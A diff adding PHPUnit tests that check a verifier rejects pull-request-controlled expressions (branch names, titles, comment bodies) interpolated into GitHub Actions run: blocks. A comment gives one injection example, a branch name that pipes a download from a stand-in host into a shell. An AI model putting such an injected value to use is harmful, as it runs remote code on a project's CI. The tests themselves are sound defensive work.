@@ -302,6 +302,91 @@ final class ReviewerDependencyTest extends MonkeyTestCase {
 	}
 
 	/**
+	 * Attacker-controlled expressions must not be interpolated into a run: block.
+	 *
+	 * A pull request branch name, title, or comment body is free text chosen by
+	 * whoever opened it. Embedded in a shell script it is not data, it is code:
+	 * a branch named 'x"; curl evil.sh | sh; #' runs here. Repository-controlled
+	 * expressions stay allowed, or the rule would flag a hundred safe uses and
+	 * be ignored.
+	 */
+	#[\PHPUnit\Framework\Attributes\DataProvider( 'unsafe_expressions' )]
+	public function test_verifier_rejects_unsafe_interpolation_in_run_blocks( string $expression ): void {
+		$root = $this->copy_automation_fixture();
+		try {
+			$workflow = $root . '/.github/workflows/ai-review.yml';
+			$source = (string) file_get_contents( $workflow );
+			$anchor = strpos( $source, 'echo "ref=$PR_HEAD_REF"' );
+			self::assertNotFalse( $anchor, 'fixture lost its read-back anchor' );
+			$source = substr( $source, 0, $anchor )
+				. 'echo "x=${{ ' . $expression . ' }}" >> "$GITHUB_OUTPUT"' . substr( $source, $anchor + strlen( 'echo "ref=$PR_HEAD_REF"' ) );
+			file_put_contents( $workflow, $source );
+			$output = array();
+			$status = 0;
+			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
+			self::assertNotSame( 0, $status, $expression . ' was interpolated into a run: block without failing' );
+			self::assertStringContainsString( 'interpolates ' . $expression, implode( "\n", $output ) );
+		} finally {
+			$this->remove_fixture( $root );
+		}
+	}
+
+	/**
+	 * Repository-controlled expressions are not a shell injection.
+	 */
+	#[\PHPUnit\Framework\Attributes\DataProvider( 'safe_expressions' )]
+	public function test_verifier_allows_repository_controlled_interpolation( string $expression ): void {
+		$root = $this->copy_automation_fixture();
+		try {
+			$workflow = $root . '/.github/workflows/ai-review.yml';
+			$source = (string) file_get_contents( $workflow );
+			$anchor = strpos( $source, 'echo "ref=$PR_HEAD_REF"' );
+			self::assertNotFalse( $anchor );
+			$source = substr( $source, 0, $anchor )
+				. 'echo "x=${{ ' . $expression . ' }}" >> "$GITHUB_OUTPUT"' . substr( $source, $anchor + strlen( 'echo "ref=$PR_HEAD_REF"' ) );
+			file_put_contents( $workflow, $source );
+			$output = array();
+			$status = 0;
+			exec( 'DUOPORT_REPO_ROOT=' . escapeshellarg( $root ) . ' php ' . escapeshellarg( $root . '/.github/scripts/verify-reviewer-dependency.php' ) . ' 2>&1', $output, $status );
+			self::assertSame( 0, $status, $expression . ' should not be treated as attacker-controlled: ' . implode( "\n", $output ) );
+		} finally {
+			$this->remove_fixture( $root );
+		}
+	}
+
+	/**
+	 * Expressions whose value a pull request author chooses.
+	 *
+	 * @return array<string, array{string}>
+	 */
+	public static function unsafe_expressions(): array {
+		return array(
+			'head ref'   => array( 'github.event.pull_request.head.ref' ),
+			'pr title'   => array( 'github.event.pull_request.title' ),
+			'pr body'    => array( 'github.event.pull_request.body' ),
+			'head_ref'   => array( 'github.head_ref' ),
+			'comment'    => array( 'github.event.comment.body' ),
+			'commit msg' => array( 'github.event.head_commit.message' ),
+		);
+	}
+
+	/**
+	 * Expressions fixed by the repository or the workflow file.
+	 *
+	 * @return array<string, array{string}>
+	 */
+	public static function safe_expressions(): array {
+		return array(
+			'repository' => array( 'github.repository' ),
+			'run id'     => array( 'github.run_id' ),
+			'server url' => array( 'github.server_url' ),
+			'vars'       => array( 'vars.OPENCODE_MODEL' ),
+			'secrets'    => array( 'secrets.GITHUB_TOKEN' ),
+			'needs'      => array( 'needs.research.outputs.total' ),
+		);
+	}
+
+	/**
 	 * A commented-out reference is documentation, not configuration.
 	 *
 	 * Documenting a superseded pin in a comment is normal practice. Counting
